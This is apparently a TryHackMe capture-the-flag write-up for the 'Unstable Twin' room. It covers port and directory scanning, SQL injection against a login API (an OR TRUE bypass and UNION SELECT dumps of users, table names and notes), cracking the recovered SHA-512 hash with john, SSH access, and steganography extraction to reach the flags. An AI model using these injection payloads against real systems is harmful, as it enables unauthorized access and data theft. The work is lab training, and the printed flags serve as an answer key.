> Unstable Twin

# Nmap

nmap -sC -sV -T4 -Pn -A -vv -p22,80 -oN nmap/initial 10.10.57.252

```bash
22/tcp open  ssh     syn-ack OpenSSH 8.0 (protocol 2.0)
80/tcp open  http    syn-ack nginx 1.14.1
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: nginx/1.14.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
```

We didn't get anything from the site. Let's move onto directory bruteforcing.

# Gobuster

gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x txt,html,bak,cgi,bin,php -o gobuster/initial

```bash
/info                 (Status: 200) [Size: 160]
/get-image
/api
```

Also we got /api. Let's search for endpoints using ffuf.

ffuf -s -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$IP/api/FUZZ

```bash
/login
```

Accessing /info gives us a message.

`"The login API needs to be called with the username and password form fields fields.  It has not been fully tested yet so may not be full developed and secure"`


As for the question to find build number let's do a curl request.

```bash
curl -v http://10.10.57.252/info
*   Trying 10.10.57.252:80...
* Connected to 10.10.57.252 (10.10.57.252) port 80 (#0)
> GET /info HTTP/1.1
> Host: 10.10.57.252
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.14.1
< Date: Sun, 13 Jun 2021 09:31:17 GMT
< Content-Type: application/json
< Content-Length: 148
< Connection: keep-alive
< Build Number: 1.3.6-final
< Server Name: Julias
< 
"The login API needs to be called with the username and password fields.  It has not been fully tested yet so may not be full developed and secure"
* Connection #0 to host 10.10.57.252 left intact
```

But it didn't work. So let's look at the response headers too!

```bash
curl -v -i http://10.10.57.252/info
*   Trying 10.10.57.252:80...
* Connected to 10.10.57.252 (10.10.57.252) port 80 (#0)
> GET /info HTTP/1.1
> Host: 10.10.57.252
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< Server: nginx/1.14.1
Server: nginx/1.14.1
< Date: Sun, 13 Jun 2021 09:34:47 GMT
Date: Sun, 13 Jun 2021 09:34:47 GMT
< Content-Type: application/json
Content-Type: application/json
< Content-Length: 160
Content-Length: 160
< Connection: keep-alive
Connection: keep-alive
< Build Number: 1.3.4-dev
Build Number: 1.3.4-dev
< Server Name: Vincent
Server Name: Vincent

< 
"The login API needs to be called with the username and password form fields fields.  It has not been fully tested yet so may not be full developed and secure"
* Connection #0 to host 10.10.57.252 left intact
```

If we repeat the request again we can see the difference in `Build Number` and `Server Name`. We ahve 2 server names `Vincent` and `Julias`. Also we have 2 builds `1.3.4-dev` and `1.3.6-final`. 

We know the api endpoint is `/api`. 

Let's try the login portal.

```bash
curl -X POST -d "username=test&password=test" http://10.10.57.252/api/login
"The username or password passed are not correct."
```

Hmm! Since the message suggests it to be vulnerable let's go for SQLi.

```bash
curl -X POST -d "username=test'&password=test" http://10.10.57.252/api/login

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request.  Either the server is overloaded or there is an error in the application.</p>
```

So we have SQLi. But the problem is we have to deal with 2 different build which means we have to execute the payload twice. First let's go for a basic payload

```bash
curl -X POST -d "username=test'OR TRUE --&password=test" http://10.10.57.252/api/login
```

```json
[
  [
    2, 
    "julias"
  ], 
  [
    4, 
    "linda"
  ], 
  [
    5, 
    "marnie"
  ], 
  [
    1, 
    "mary_ann"
  ], 
  [
    3, 
    "vincent"
  ]
]
```

Oooh! We got the users. Let's try to get passwords using UNION based Injection.

```bash
curl -X POST -d "username=test' UNION SELECT username,password FROM users--&password=test" http://10.10.57.252/api/login
```

And we got the colors.

```json
[
  [
    "julias", 
    "Red"
  ], 
  [
    "linda", 
    "Green"
  ], 
  [
    "marnie", 
    "Yellow "
  ], 
  [
    "mary_ann", 
    "continue..."
  ], 
  [
    "vincent", 
    "Orange"
  ]
]
```

Now we can dump table names.

```bash
curl -X POST -d "username=test' UNION SELECT 1,tbl_name FROM sqlite_master--&password=test" http://10.10.57.252/api/login
```

```json
[
  [
    1, 
    "notes" => Let's try this one
  ], 
  [
    1, 
    "sqlite_sequence"
  ], 
  [
    1, 
    "users"
  ]
]
```

```bash
curl -X POST -d "username=test' UNION SELECT 1,notes FROM notes--&password=test" http://10.10.57.252/api/login
```

```json
[
  [
    1, 
    "I have left my notes on the server.  They will me help get the family back together. "
  ], 
  [
    1, 
    "My Password is eaf0651dabef9c7de8a70843030924d335a2a8ff5fd1b13c4cb099e66efe25ecaa607c4b7dd99c43b0c01af669c90fd6a14933422cf984324f645b84427343f4\n"
  ]
]
```

Let's crack the hash using john!

john --format=Raw-SHA512 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

```bash
experiment       (?)
```

And it is Mary Ann's SSH password. We are in!

# user.flag

```
THM{Mary_Ann_notes}
```

We can also find another txt file.

# server_notes.txt 

```bash
Now you have found my notes you now you need to put my extended family together.

We need to GET their IMAGE for the family album.  These can be retrieved by NAME.

You need to find all of them and a picture of myself!
```

And since we already know /get-image we have perform GET requets to get the image. We can extract images using this format `curl -v "http://10.10.57.252/get_image?name=$NAME" --output outfile.jpg`.

Since we are in as mary_ann let's try her image.

```bash
curl -v "http://10.10.57.252/get_image?name=mary_ann" --output mary_ann.jpg
steghide extract -sf mary_ann.jpg
```

# mary_ann.txt

```
You need to find all my children and arrange in a rainbow!
```

```bash
curl -v "http://10.10.57.252/get_image?name=julias" --output julia.jpg
curl -v "http://10.10.57.252/get_image?name=linda" --output linda.jpg
curl -v "http://10.10.57.252/get_image?name=marnie" --output marnie.jpg
curl -v "http://10.10.57.252/get_image?name=vincent" --output vincent.jpg
```

After extracting the files from the images let's arrange them in ROYGBIV order.

```
Red - 1DVsdb2uEE0k5HK4GAIZ
Orange - PS0Mby2jomUKLjvQ4OSw
Yellow - jKLNAAeCdl2J8BCRuXVX
Green - eVYvs6J6HKpZWPG8pfeHoNG1 
```

And base62 decoding them we got the flag.

```
You have found the final flag THM{The_Family_Is_Back_Together}
```